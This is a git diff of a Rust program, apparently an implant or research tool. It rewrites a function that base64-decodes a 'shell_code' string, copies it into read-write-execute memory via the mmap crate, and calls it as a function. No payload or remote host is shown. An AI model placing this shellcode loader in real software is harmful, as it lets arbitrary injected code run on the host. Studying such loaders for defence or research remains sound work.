@@ -139,43 +139,23 @@ async fn main() {
     }
 }
 
-use libc::{
-    c_uint, c_void, mmap, size_t, MAP_ANONYMOUS, MAP_PRIVATE, PROT_EXEC, PROT_READ, PROT_WRITE,
+use mmap::{
+    MapOption::{MapExecutable, MapReadable, MapWritable},
+    MemoryMap,
 };
+
 use std::mem;
-use std::ptr;
-use std::slice;
 
 unsafe fn run(shell_code: &str) {
     // probably needs to be page aligned...
-    let code_bytes: size_t = 4096;
+    // let code_bytes: size_t = 4096;
     let shell_code = base64::decode(shell_code).unwrap();
-
-    // This is the Linux-ism here
-    // It might work on other 'nix-es, I don't know, but it would almost
-    // certainly need a separate, Windows-specific implementation.
-    let virtual_code_address: *mut c_void = mmap(
-        ptr::null_mut(),
-        code_bytes,
-        PROT_READ | PROT_WRITE | PROT_EXEC,
-        MAP_ANONYMOUS | MAP_PRIVATE,
-        0,
-        0,
-    );
-
-    println!("virtual_code_address = {:?}", virtual_code_address);
-
-    // write some code in
-    {
-        let temp_code: &mut [u8] =
-            slice::from_raw_parts_mut(virtual_code_address as *mut u8, code_bytes);
-        &temp_code[..shell_code.len()].copy_from_slice(&shell_code);
-    }
-
-    // I'm pretty sure that this, at least, is defined behavior.
-    // Otherwise, it's impossible under Rust to take advantage of executable
-    // pages allocated through mmap.
-    let asm_func: extern "C" fn() -> c_uint = mem::transmute(virtual_code_address);
+    let mem_map =  MemoryMap::new(shell_code.len(), &[MapReadable, MapWritable, MapExecutable]).unwrap();
+    println!("virtual_code_address = {:?}", mem_map.data());
+    
+    std::ptr::copy(shell_code.as_ptr(), mem_map.data(), shell_code.len());
+    
+    let asm_func: extern "C" fn() -> u32 = mem::transmute(mem_map.data());
 
     // Finally, execute our function and extract the result.
     let out = asm_func();
